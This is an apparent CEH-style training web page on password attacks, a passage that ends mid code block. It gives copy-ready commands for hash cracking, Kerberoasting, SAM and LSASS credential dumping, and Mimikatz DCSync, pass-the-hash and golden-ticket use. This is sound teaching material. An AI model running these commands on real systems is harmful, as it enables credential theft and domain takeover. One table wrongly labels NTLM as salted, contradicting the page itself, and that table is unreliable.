<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Attacks Lab - Dark Arts Vault | Hexworth Prime</title>

    <!-- Hexworth Integration -->
    <script src="../../components/AccessGuard.js"></script>
    <script>
        AccessGuard.require('sorted');
    </script>
    <script src="../../components/AchievementManager.js"></script>
    <script src="../../components/ModuleProgress.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a0a1a 0%, #2d0a2d 100%);
            min-height: 100vh;
            padding: 20px;
            color: #e0e0e0;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            background: rgba(26, 10, 26, 0.95);
            border-radius: 15px;
            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            border: 2px solid rgba(168, 85, 247, 0.3);
        }

        .header {
            background: linear-gradient(135deg, #7c3aed 0%, #dc2626 100%);
            padding: 30px;
            text-align: center;
            border-bottom: 3px solid #a855f7;
        }

        .header h1 {
            color: #ffffff;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .header p {
            color: #f0e0f0;
            font-size: 1.1em;
        }

        .header .warning-banner {
            background: rgba(220, 38, 38, 0.3);
            border: 2px solid #dc2626;
            border-radius: 8px;
            padding: 12px 20px;
            margin-top: 15px;
            color: #fca5a5;
            font-weight: 600;
        }

        .back-link {
            display: inline-block;
            margin-top: 15px;
            padding: 10px 20px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            transition: all 0.3s ease;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }

        .back-link:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }

        .main-content {
            display: grid;
            grid-template-columns: 1fr 380px;
            gap: 0;
            min-height: calc(100vh - 200px);
        }

        .workspace {
            display: flex;
            flex-direction: column;
            border-right: 2px solid rgba(168, 85, 247, 0.3);
        }

        .tab-container {
            display: flex;
            background: rgba(26, 10, 26, 0.9);
            border-bottom: 2px solid rgba(168, 85, 247, 0.3);
            padding: 10px 20px 0;
            gap: 5px;
            flex-wrap: wrap;
        }

        .tab {
            padding: 12px 24px;
            background: rgba(168, 85, 247, 0.1);
            border: 2px solid transparent;
            border-bottom: none;
            border-radius: 8px 8px 0 0;
            cursor: pointer;
            transition: all 0.3s ease;
            color: #b0b0b0;
            font-weight: 500;
        }

        .tab:hover {
            background: rgba(168, 85, 247, 0.2);
            color: #e0e0e0;
        }

        .tab.active {
            background: rgba(168, 85, 247, 0.3);
            border-color: #a855f7;
            color: #ffffff;
        }

        .content-area {
            flex: 1;
            overflow-y: auto;
            padding: 30px;
        }

        .section {
            display: none;
            animation: fadeIn 0.3s ease;
        }

        .section.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h2 {
            color: #a855f7;
            margin-bottom: 20px;
            font-size: 1.8em;
            border-bottom: 2px solid rgba(168, 85, 247, 0.3);
            padding-bottom: 10px;
        }

        h3 {
            color: #c084fc;
            margin-top: 25px;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        h4 {
            color: #e9d5ff;
            margin-top: 20px;
            margin-bottom: 12px;
            font-size: 1.1em;
        }

        p, li {
            line-height: 1.8;
            color: #d0d0d0;
            margin-bottom: 12px;
        }

        ul, ol {
            margin-left: 25px;
            margin-bottom: 15px;
        }

        .callout {
            background: rgba(168, 85, 247, 0.1);
            border-left: 4px solid #a855f7;
            padding: 15px 20px;
            margin: 20px 0;
            border-radius: 4px;
        }

        .callout.warning {
            background: rgba(220, 38, 38, 0.1);
            border-left-color: #dc2626;
        }

        .callout.info {
            background: rgba(59, 130, 246, 0.1);
            border-left-color: #3b82f6;
        }

        .callout.success {
            background: rgba(34, 197, 94, 0.1);
            border-left-color: #22c55e;
        }

        code {
            background: rgba(0, 0, 0, 0.3);
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            color: #fbbf24;
            font-size: 0.9em;
        }

        pre {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 8px;
            padding: 15px;
            overflow-x: auto;
            margin: 15px 0;
            position: relative;
        }

        pre code {
            background: none;
            padding: 0;
            color: #a5f3fc;
            font-size: 0.95em;
        }

        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(168, 85, 247, 0.3);
            border: 1px solid #a855f7;
            color: #fff;
            padding: 5px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.85em;
            transition: all 0.3s ease;
        }

        .copy-btn:hover {
            background: rgba(168, 85, 247, 0.5);
        }

        .copy-btn.copied {
            background: rgba(34, 197, 94, 0.5);
            border-color: #22c55e;
        }

        .tool-container {
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid #a855f7;
            border-radius: 10px;
            padding: 25px;
            margin: 25px 0;
        }

        .tool-title {
            color: #a855f7;
            font-size: 1.2em;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            color: #c084fc;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-group input,
        .input-group select,
        .input-group textarea {
            width: 100%;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(168, 85, 247, 0.5);
            border-radius: 5px;
            color: #fff;
            font-family: 'Courier New', monospace;
        }

        .input-group textarea {
            min-height: 80px;
            resize: vertical;
        }

        .btn {
            padding: 10px 20px;
            background: linear-gradient(135deg, #7c3aed, #a855f7);
            border: none;
            border-radius: 5px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            margin-right: 10px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(168, 85, 247, 0.4);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #666, #888);
        }

        .output {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 5px;
            padding: 15px;
            margin-top: 15px;
            font-family: 'Courier New', monospace;
            color: #4ade80;
            min-height: 60px;
        }

        .sidebar {
            background: rgba(15, 5, 15, 0.9);
            padding: 25px;
            overflow-y: auto;
        }

        .sidebar h3 {
            color: #a855f7;
            margin-bottom: 20px;
            text-align: center;
        }

        .quiz-container {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 20px;
        }

        .question {
            margin-bottom: 25px;
            padding: 15px;
            background: rgba(168, 85, 247, 0.05);
            border-radius: 6px;
            border-left: 3px solid #a855f7;
        }

        .question-text {
            color: #e0e0e0;
            margin-bottom: 12px;
            font-weight: 500;
        }

        .option {
            padding: 10px;
            margin: 8px 0;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .option:hover {
            background: rgba(168, 85, 247, 0.2);
            border-color: #a855f7;
        }

        .option.selected {
            background: rgba(168, 85, 247, 0.3);
            border-color: #a855f7;
        }

        .option.correct {
            background: rgba(34, 197, 94, 0.3);
            border-color: #22c55e;
        }

        .option.incorrect {
            background: rgba(220, 38, 38, 0.3);
            border-color: #dc2626;
        }

        .quiz-submit {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #7c3aed, #dc2626);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 1.1em;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .quiz-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(168, 85, 247, 0.5);
        }

        .quiz-submit:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .quiz-result {
            text-align: center;
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
            font-weight: 600;
        }

        .quiz-result.pass {
            background: rgba(34, 197, 94, 0.2);
            border: 2px solid #22c55e;
            color: #4ade80;
        }

        .quiz-result.fail {
            background: rgba(220, 38, 38, 0.2);
            border: 2px solid #dc2626;
            color: #fca5a5;
        }

        .metric-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }

        .metric-card {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 8px;
            padding: 15px;
            text-align: center;
        }

        .metric-label {
            color: #9ca3af;
            font-size: 0.85em;
            margin-bottom: 8px;
        }

        .metric-value {
            color: #a855f7;
            font-size: 1.8em;
            font-weight: 700;
        }

        .table-container {
            overflow-x: auto;
            margin: 20px 0;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            overflow: hidden;
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(168, 85, 247, 0.2);
        }

        th {
            background: rgba(168, 85, 247, 0.2);
            color: #a855f7;
            font-weight: 600;
        }

        tr:hover {
            background: rgba(168, 85, 247, 0.1);
        }

        .hash-type-badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 0.85em;
            font-weight: 600;
        }

        .badge-md5 { background: rgba(239, 68, 68, 0.3); color: #fca5a5; }
        .badge-sha { background: rgba(59, 130, 246, 0.3); color: #93c5fd; }
        .badge-ntlm { background: rgba(168, 85, 247, 0.3); color: #c084fc; }
        .badge-bcrypt { background: rgba(34, 197, 94, 0.3); color: #4ade80; }

        @media (max-width: 1024px) {
            .main-content {
                grid-template-columns: 1fr;
            }

            .workspace {
                border-right: none;
                border-bottom: 2px solid rgba(168, 85, 247, 0.3);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Password Attacks Lab</h1>
            <p>CEH v12 Chapter 6 - Password Cracking and Authentication Attacks</p>
            <div class="warning-banner">
                ⚠️ FOR EDUCATIONAL PURPOSES ONLY - Use only on systems you own or have explicit permission to test
            </div>
            <a href="../index.html" class="back-link">← Back to Dark Arts Vault</a>
        </div>

        <div class="main-content">
            <div class="workspace">
                <div class="tab-container">
                    <div class="tab active" data-section="overview">Overview</div>
                    <div class="tab" data-section="attack-types">Attack Types</div>
                    <div class="tab" data-section="windows-auth">Windows Auth</div>
                    <div class="tab" data-section="tools">Tool Reference</div>
                    <div class="tab" data-section="interactive">Interactive Tools</div>
                    <div class="tab" data-section="defense">Defense</div>
                </div>

                <div class="content-area">
                    <!-- Overview Section -->
                    <div class="section active" id="overview">
                        <h2>Password Attack Fundamentals</h2>

                        <p>Password attacks are one of the most common and effective methods used by attackers to gain unauthorized access to systems. Understanding these techniques is critical for both offensive security testing and defensive implementation.</p>

                        <h3>Attack Methodology Overview</h3>
                        <p>Password attacks follow a systematic approach:</p>
                        <ol>
                            <li><strong>Reconnaissance:</strong> Gather information about target users, password policies, and authentication mechanisms</li>
                            <li><strong>Hash Acquisition:</strong> Obtain password hashes through various techniques (SAM dumping, LSASS extraction, network sniffing)</li>
                            <li><strong>Attack Selection:</strong> Choose appropriate attack method based on hash type, available resources, and time constraints</li>
                            <li><strong>Cracking:</strong> Execute the attack using appropriate tools and wordlists</li>
                            <li><strong>Verification:</strong> Test cracked credentials against target systems</li>
                        </ol>

                        <div class="callout info">
                            <strong>Key Concept:</strong> Modern password attacks are not about "guessing" - they're about systematic enumeration using sophisticated techniques, massive computing power, and social engineering insights.
                        </div>

                        <h3>Password Storage Fundamentals</h3>
                        <p>Understanding how passwords are stored is crucial for attack success:</p>

                        <div class="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Storage Method</th>
                                        <th>Security Level</th>
                                        <th>Attack Approach</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>Plaintext</td>
                                        <td><span class="badge-md5">Critical Risk</span></td>
                                        <td>Direct access - no cracking needed</td>
                                    </tr>
                                    <tr>
                                        <td>Encoding (Base64, Hex)</td>
                                        <td><span class="badge-md5">Critical Risk</span></td>
                                        <td>Trivial decoding - not encryption</td>
                                    </tr>
                                    <tr>
                                        <td>Weak Hashing (MD5, SHA1)</td>
                                        <td><span class="badge-md5">High Risk</span></td>
                                        <td>Rainbow tables, fast cracking</td>
                                    </tr>
                                    <tr>
                                        <td>Salted Hashing (NTLM)</td>
                                        <td><span class="badge-ntlm">Medium Risk</span></td>
                                        <td>Brute force, dictionary attacks</td>
                                    </tr>
                                    <tr>
                                        <td>Adaptive Hashing (bcrypt, Argon2)</td>
                                        <td><span class="badge-bcrypt">Lower Risk</span></td>
                                        <td>Slow, resource-intensive cracking</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>

                        <h3>Common Hash Types</h3>
                        <p>Recognizing hash types is the first step in any password cracking operation:</p>

                        <div class="metric-grid">
                            <div class="metric-card">
                                <div class="metric-label">MD5</div>
                                <div class="metric-value" style="font-size: 0.9em;">32 hex chars</div>
                                <p style="margin-top: 10px; font-size: 0.85em;">5d41402abc4b2a76b9719d911017c592</p>
                            </div>
                            <div class="metric-card">
                                <div class="metric-label">SHA-1</div>
                                <div class="metric-value" style="font-size: 0.9em;">40 hex chars</div>
                                <p style="margin-top: 10px; font-size: 0.85em;">aaf4c61ddcc5e8a2dab...</p>
                            </div>
                            <div class="metric-card">
                                <div class="metric-label">NTLM</div>
                                <div class="metric-value" style="font-size: 0.9em;">32 hex chars</div>
                                <p style="margin-top: 10px; font-size: 0.85em;">209c6174da490caeb422f3fa...</p>
                            </div>
                            <div class="metric-card">
                                <div class="metric-label">bcrypt</div>
                                <div class="metric-value" style="font-size: 0.9em;">60 chars</div>
                                <p style="margin-top: 10px; font-size: 0.85em;">$2b$10$N9qo8uLO...</p>
                            </div>
                        </div>

                        <div class="callout warning">
                            <strong>Ethical Reminder:</strong> These techniques must only be used on systems you own or have written authorization to test. Unauthorized access is illegal and unethical.
                        </div>
                    </div>

                    <!-- Attack Types Section -->
                    <div class="section" id="attack-types">
                        <h2>Password Attack Techniques</h2>

                        <h3>1. Dictionary Attacks</h3>
                        <p>Dictionary attacks use pre-compiled wordlists containing common passwords, words, and phrases. This is typically the first attack method due to its effectiveness against weak passwords.</p>

                        <div class="callout info">
                            <strong>Success Rate:</strong> Dictionary attacks successfully crack 30-40% of passwords in most corporate environments within minutes.
                        </div>

                        <h4>Common Wordlists</h4>
                        <ul>
                            <li><strong>rockyou.txt:</strong> 14+ million real-world passwords (145MB) - the gold standard</li>
                            <li><strong>SecLists:</strong> Comprehensive collection organized by category</li>
                            <li><strong>CrackStation:</strong> 15GB wordlist with 1.5 billion entries</li>
                            <li><strong>Custom wordlists:</strong> Built from target reconnaissance (company names, industry terms, locations)</li>
                        </ul>

                        <h4>Dictionary Attack Example</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># John the Ripper - Basic dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat - Dictionary attack against NTLM hashes
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt

# Show cracked passwords
john --show hashes.txt</code></pre>

                        <h3>2. Brute Force Attacks</h3>
                        <p>Brute force attacks systematically try every possible character combination. While guaranteed to succeed given enough time, they're computationally expensive and time-consuming.</p>

                        <h4>Character Set Definitions</h4>
                        <div class="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Hashcat Mask</th>
                                        <th>Character Set</th>
                                        <th>Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr><td><code>?l</code></td><td>abcdefghijklmnopqrstuvwxyz</td><td>Lowercase letters</td></tr>
                                    <tr><td><code>?u</code></td><td>ABCDEFGHIJKLMNOPQRSTUVWXYZ</td><td>Uppercase letters</td></tr>
                                    <tr><td><code>?d</code></td><td>0123456789</td><td>Digits</td></tr>
                                    <tr><td><code>?s</code></td><td>!@#$%^&*()_+-=[]{}|;:,.<>?</td><td>Special characters</td></tr>
                                    <tr><td><code>?a</code></td><td>?l?u?d?s combined</td><td>All printable ASCII</td></tr>
                                    <tr><td><code>?b</code></td><td>0x00 - 0xFF</td><td>All bytes</td></tr>
                                </tbody>
                            </table>
                        </div>

                        <h4>Brute Force Examples</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Hashcat - 8-character brute force (all characters)
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# Common pattern: Uppercase + lowercase + digits (Password123)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?l?d?d?d

# Incremental attack (John) - starts short, increases length
john --incremental hashes.txt

# Mask attack targeting common pattern: Capital + 6 lowercase + 2 digits
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d</code></pre>

                        <div class="callout warning">
                            <strong>Time Consideration:</strong> An 8-character brute force using all printable ASCII characters (95 possibilities per position) requires testing 6,634,204,312,890,625 combinations. On modern hardware, this could take years.
                        </div>

                        <h3>3. Hybrid Attacks</h3>
                        <p>Hybrid attacks combine dictionary words with rule-based modifications, dramatically increasing effectiveness while maintaining reasonable speed.</p>

                        <h4>Common Hybrid Patterns</h4>
                        <ul>
                            <li>Dictionary word + numbers: <code>password123</code>, <code>summer2024</code></li>
                            <li>Dictionary word + special chars: <code>password!</code>, <code>welcome@123</code></li>
                            <li>Leetspeak substitutions: <code>p@ssw0rd</code>, <code>h4ck3r</code></li>
                            <li>Capitalization variants: <code>Password</code>, <code>PASSWORD</code></li>
                        </ul>

<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Hashcat - Hybrid wordlist + mask (append numbers)
hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d

# Hashcat - Hybrid mask + wordlist (prepend uppercase)
hashcat -m 1000 -a 7 hashes.txt ?u?u rockyou.txt

# John - Apply rules to wordlist
john --wordlist=rockyou.txt --rules=best64 hashes.txt</code></pre>

                        <h3>4. Rainbow Table Attacks</h3>
                        <p>Rainbow tables are precomputed hash databases that trade disk space for computation time. They work only against unsalted hashes.</p>

                        <div class="callout info">
                            <strong>How Rainbow Tables Work:</strong> Instead of computing hashes in real-time, rainbow tables store billions of precomputed hash-password pairs. This allows instant lookups but requires massive storage (100GB+ for comprehensive tables).
                        </div>

                        <h4>Rainbow Table Limitations</h4>
                        <ul>
                            <li><strong>Salting defeats rainbow tables:</strong> Each unique salt requires a completely new table</li>
                            <li><strong>Storage requirements:</strong> Comprehensive tables require terabytes of storage</li>
                            <li><strong>Hash algorithm specific:</strong> Separate tables needed for MD5, SHA-1, NTLM, etc.</li>
                        </ul>

<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># RainbowCrack - Generate rainbow tables
rtgen md5 loweralpha 1 8 0 3800 33554432 0

# RainbowCrack - Crack with rainbow tables
rcrack /path/to/tables -h 5f4dcc3b5aa765d61d8327deb882cf99

# Ophcrack (Windows) - GUI-based rainbow table tool
# Particularly effective against Windows LM/NTLM hashes</code></pre>

                        <h3>5. Rule-Based Attacks</h3>
                        <p>Rule-based attacks apply transformation rules to wordlist entries, creating intelligent mutations based on common password patterns.</p>

                        <h4>John the Ripper Rule Syntax</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Sample John rules (john.conf)
[List.Rules:Custom]
# Capitalize first letter
c
# Toggle case of all characters
t
# Append current year
$2 $0 $2 $4
# Prepend and append !
^! $!
# Leetspeak conversion
sa@ se3 si1 so0 ss$</code></pre>

                        <h4>Hashcat Rule Examples</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Hashcat - Use built-in best64 rules
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Common hashcat rule functions:
# c   - Capitalize first letter
# u   - Uppercase all
# l   - Lowercase all
# $X  - Append character X
# ^X  - Prepend character X
# sXY - Replace X with Y

# Custom rule file example (custom.rule):
c $1 $2 $3          # Capitalize + append 123
c $! $@             # Capitalize + append !@
l $2 $0 $2 $4       # Lowercase + append 2024</code></pre>

                        <div class="callout success">
                            <strong>Best Practice:</strong> Start with dictionary attacks, then apply rule-based mutations, and only resort to brute force for high-value targets or when other methods fail.
                        </div>
                    </div>

                    <!-- Windows Authentication Section -->
                    <div class="section" id="windows-auth">
                        <h2>Windows Authentication Deep Dive</h2>

                        <h3>Windows Authentication Protocols</h3>

                        <h4>1. NTLM (NT LAN Manager)</h4>
                        <p>NTLM is a challenge-response authentication protocol still widely used in Windows environments, despite being considered legacy.</p>

                        <div class="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Aspect</th>
                                        <th>NTLM</th>
                                        <th>NTLMv2</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>Hash Format</td>
                                        <td>MD4 of password (16 bytes)</td>
                                        <td>HMAC-MD5 challenge-response</td>
                                    </tr>
                                    <tr>
                                        <td>Vulnerability</td>
                                        <td>Pass-the-hash attacks</td>
                                        <td>Relay attacks possible</td>
                                    </tr>
                                    <tr>
                                        <td>Crackability</td>
                                        <td><span class="badge-md5">High</span></td>
                                        <td><span class="badge-ntlm">Medium</span></td>
                                    </tr>
                                    <tr>
                                        <td>Salting</td>
                                        <td>No</td>
                                        <td>Uses challenge (salt)</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>

                        <h4>NTLM Hash Format</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># NTLM hash example (32 hex characters)
209c6174da490caeb422f3fa5a7ae634

# Combined LM:NTLM format (from SAM)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::

# Format breakdown:
# Username : RID : LM Hash : NTLM Hash : Comment : Home Dir : (empty fields)
</code></pre>

                        <h4>2. Kerberos Authentication</h4>
                        <p>Kerberos is the default authentication protocol in modern Active Directory environments, using tickets instead of password hashes.</p>

                        <div class="callout info">
                            <strong>Kerberos Flow:</strong>
                            <ol style="margin-top: 10px;">
                                <li>User requests TGT (Ticket Granting Ticket) from KDC</li>
                                <li>KDC validates credentials and issues encrypted TGT</li>
                                <li>User presents TGT to request service tickets</li>
                                <li>Service validates ticket and grants access</li>
                            </ol>
                        </div>

                        <h4>Kerberos Attack Vectors</h4>
                        <ul>
                            <li><strong>Kerberoasting:</strong> Request service tickets for SPNs, crack offline</li>
                            <li><strong>AS-REP Roasting:</strong> Extract crackable hashes from accounts without Kerberos pre-auth</li>
                            <li><strong>Golden Ticket:</strong> Forge TGTs using compromised KRBTGT hash</li>
                            <li><strong>Silver Ticket:</strong> Forge service tickets using service account hashes</li>
                        </ul>

<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Kerberoasting with impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# AS-REP Roasting (accounts with pre-auth disabled)
GetNPUsers.py domain.local/ -dc-ip 10.10.10.10 -request

# Crack Kerberos tickets with hashcat
hashcat -m 13100 krb5tgs.txt rockyou.txt  # TGS-REP
hashcat -m 18200 asrep.txt rockyou.txt    # AS-REP</code></pre>

                        <h3>SAM Database (Security Account Manager)</h3>
                        <p>The SAM database stores local user account information and password hashes on Windows systems.</p>

                        <h4>SAM File Locations</h4>
                        <ul>
                            <li><strong>Active SAM:</strong> <code>C:\Windows\System32\config\SAM</code> (locked while OS running)</li>
                            <li><strong>Backup:</strong> <code>C:\Windows\System32\config\RegBack\SAM</code></li>
                            <li><strong>Volume Shadow Copy:</strong> Previous versions accessible via VSS</li>
                        </ul>

                        <h4>SAM Extraction Techniques</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Method 1: Registry hives extraction (requires admin)
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive

# Method 2: Volume Shadow Copy
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\

# Method 3: Offline extraction (boot from external OS)
# Mount drive and copy SAM/SYSTEM files

# Extract hashes using samdump2 (Linux)
samdump2 system.hive sam.hive

# Extract hashes using impacket (secretsdump.py)
secretsdump.py -sam sam.hive -system system.hive LOCAL</code></pre>

                        <h3>LSASS Memory Dumping</h3>
                        <p>The Local Security Authority Subsystem Service (LSASS) process stores credentials in memory. Dumping LSASS memory can reveal plaintext passwords and hashes of logged-in users.</p>

                        <div class="callout warning">
                            <strong>Defender Alert:</strong> LSASS dumping is a high-value IOC (Indicator of Compromise). Modern EDR solutions actively monitor LSASS access. Use with extreme caution in red team operations.
                        </div>

                        <h4>LSASS Dumping Methods</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Method 1: Task Manager (GUI - leaves obvious traces)
# Right-click lsass.exe → Create dump file

# Method 2: ProcDump (Sysinternals - less suspicious)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3: Comsvcs.dll (Native Windows DLL)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# Method 4: PowerShell (requires admin)
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\

# Parse dump with Mimikatz (offline)
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords</code></pre>

                        <h3>Mimikatz - The Credential Extraction King</h3>
                        <p>Mimikatz is the most powerful credential dumping tool for Windows environments, capable of extracting plaintext passwords, hashes, PINs, and Kerberos tickets.</p>

                        <h4>Essential Mimikatz Commands</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Elevate to SYSTEM privileges
privilege::debug
token::elevate

# Dump all credentials from LSASS memory
sekurlsa::logonpasswords

# Dump specific credential types
sekurlsa::wdigest           # Plaintext passwords (older Windows)
sekurlsa::msv               # NTLM hashes
sekurlsa::kerberos          # Kerberos tickets
sekurlsa::tspkg             # Terminal Services credentials

# Extract SAM database hashes
lsadump::sam

# Extract Domain Cached Credentials
lsadump::cache

# LSA Secrets (service account passwords, auto-logon)
lsadump::secrets

# DCSync attack (requires Domain Admin or equivalent)
lsadump::dcsync /domain:corp.local /user:Administrator

# Pass-the-Hash attack
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:cmd.exe

# Golden Ticket creation
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500

# Extract all Kerberos tickets
sekurlsa::tickets /export</code></pre>

                        <div class="callout success">
                            <strong>Pro Tip:</strong> Modern Windows 10/11 systems with Credential Guard enabled significantly limit Mimikatz effectiveness. Always check for security features before attempting credential dumping.
                        </div>

                        <h4>Domain Cached Credentials (DCC)</h4>
                        <p>Windows caches domain credentials locally to allow logon when domain controllers are unavailable. These cached credentials can be extracted and cracked.</p>

<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Extract cached credentials with Mimikatz
mimikatz # lsadump::cache

# DCC2 format (modern Windows)
# Requires 10,240 iterations of PBKDF2-HMAC-SHA1
# Significantly slower to crack than NTLM

# Crack with hashcat (mode 2100)
hashcat -m 2100 cached_creds.txt rockyou.txt</code></pre>
                    </div>

                    <!-- Tools Reference Section -->
                    <div class="section" id="tools">
                        <h2>Password Cracking Tool Reference</h2>

                        <h3>John the Ripper</h3>
                        <p>John the Ripper is a versatile, open-source password cracker that supports numerous hash types and attack modes.</p>

                        <h4>Basic Usage</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Basic dictionary attack
john --wordlist=rockyou.txt hashes.txt

# With rules applied
john --wordlist=rockyou.txt --rules=best64 hashes.txt

# Incremental mode (brute force)
john --incremental hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specify format explicitly
john --format=NT --wordlist=rockyou.txt ntlm_hashes.txt

# Resume interrupted session
john --restore

# Check available formats
john --list=formats

# Single crack mode (username-based mangling)
john --single hashes.txt</code></pre>

                        <h4>Hash Format Examples</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Unix/Linux passwords (from /etc/shadow)
root:$6$rounds=5000$salt$hash:18532:0:99999:7:::

# Windows NTLM (from SAM)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::

# MD5 hash
username:5d41402abc4b2a76b9719d911017c592

# SHA-512 (Linux)
$6$rounds=5000$saltsaltsal$hash_value_here</code></pre>

                        <h3>Hashcat</h3>
                        <p>Hashcat is the world's fastest password cracker, supporting GPU acceleration and 300+ hash algorithms.</p>

                        <h4>Common Hash Types (-m flag)</h4>
                        <div class="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Mode</th>
                                        <th>Hash Type</th>
                                        <th>Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr><td>0</td><td>MD5</td><td>Unsalted MD5 hash</td></tr>
                                    <tr><td>100</td><td>SHA1</td><td>Unsalted SHA1 hash</td></tr>
                                    <tr><td>1000</td><td>NTLM</td><td>Windows NTLM hash</td></tr>
                                    <tr><td>1800</td><td>sha512crypt</td><td>Linux $6$ hash</td></tr>
                                    <tr><td>3200</td><td>bcrypt</td><td>bcrypt $2*$ hash</td></tr>
                                    <tr><td>5600</td><td>NetNTLMv2</td><td>Network NTLM v2</td></tr>
                                    <tr><td>13100</td><td>Kerberos 5 TGS-REP</td><td>Kerberoasting</td></tr>
                                    <tr><td>18200</td><td>Kerberos 5 AS-REP</td><td>AS-REP Roasting</td></tr>
                                </tbody>
                            </table>
                        </div>

                        <h4>Attack Modes (-a flag)</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># -a 0: Straight dictionary attack
